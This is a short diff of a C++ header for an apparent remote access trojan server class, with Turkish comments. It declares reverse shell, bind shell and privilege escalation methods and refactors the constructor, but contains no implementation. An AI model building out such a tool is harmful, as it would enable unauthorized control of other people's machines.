@@ -3,21 +3,24 @@
 
 #include "csock.hpp"
 #include "temDefines.hpp"
+
 #include <vector>
 
 class RatServer{
 private:
     TEM_TARGET_OS targetOs;    
+    
     std::vector<std::vector<char*>> interfaceIPV4;
+    std::string ratIP;
 
     uint ratPort;
-    const char *ratIP;
+
 
    
 public:
-    RatServer(uint ratPort,const char *ratIP);      //rat serveri baslatir
+    RatServer(uint ratPort,const char *ratIP,TEM_TARGET_OS targetOs); //rat serveri baslatir
     
-    bool temReverseShell(TEM_TARGET_OS targetOs);   //reverse shell baslatir
+    bool temReverseShell();                                           //reverse shell baslatir
     bool temBindShell();                            //bind shell portuna baglanir
 
     bool temPrivilegeEscalation();                  //yetki yukseltme
